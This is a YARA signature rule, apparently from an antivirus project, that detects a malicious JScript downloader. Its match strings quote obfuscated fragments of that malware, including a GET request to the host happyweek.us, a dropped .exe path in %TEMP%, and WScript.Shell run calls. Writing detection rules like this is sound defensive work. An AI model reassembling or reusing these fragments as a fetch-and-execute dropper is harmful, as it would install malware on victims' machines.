rule sig_20160328_c9d45727b6a9b82c347639da0e1bc32d {
  meta:
    description = "datamaliciousorder - file 20160328_c9d45727b6a9b82c347639da0e1bc32d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e81611564f3668411f0fdfac19b48c1a07723d8e4e76d755d20dd0eb92d47a7d"

  strings:
    $s1  = "function Iqnovon() {return Olkprtc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"5cBVeIo8L8j.exe\";};" fullword ascii
    $s2  = "do {WScript[Adqhxnjb](Pjbjngnepu() * 11)} while (Qmdommyde[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Hfofs(Esvbyuxwq, Jlzyby){return Esvbyuxwq - Jlzyby;};" fullword ascii
    $s4  = "var Olkprtc = function Rdzzwj() {return WScript[Izunecn](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Qmdommyde[Erhrynl](\"GET\", \"http://happyweek.us/kei3a\", false);" fullword ascii
    $s6  = "function Gimzeem(Oqnblwhrv){Olkprtc[\"Run\"](Oqnblwhrv, Mgvdvhic, Mgvdvhic);};" fullword ascii
    $s7  = "function Hnjmfub() {return ((Xahtu == true) && (Xahtu == Wpfaftfdil)) ? 1 : Mgvdvhic;};" fullword ascii
    $s8  = "return Hfofs(Yaehgalvp, Sdijp);" fullword ascii
    $s9  = "function Wefsnc(Rmetqnuo) {var Ggyez = (1, 2, 3, 4, 5, Rmetqnuo); return Ggyez;};" fullword ascii
    $s10 = "var Wpfaftfdil = false;" fullword ascii
    $s11 = " while (Puglp){" fullword ascii
    $s12 = "Wpfaftfdil = true; " fullword ascii
    $s13 = "function Qacccnrkp(){return Izunecn;};" fullword ascii
    $s14 = "var Xahtu = false;" fullword ascii
    $s15 = "Xahtu = true; " fullword ascii
    $s16 = "function Wtnikbmx()" fullword ascii
    $s17 = "var Rlvucl = false;" fullword ascii
    $s18 = "function Pjbjngnepu(){return 22;};" fullword ascii
    $s19 = "var Yfysom = new this[\"Date\"]();" fullword ascii
    $s20 = "function Lmrvtoaw(){return Lqkmkn;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}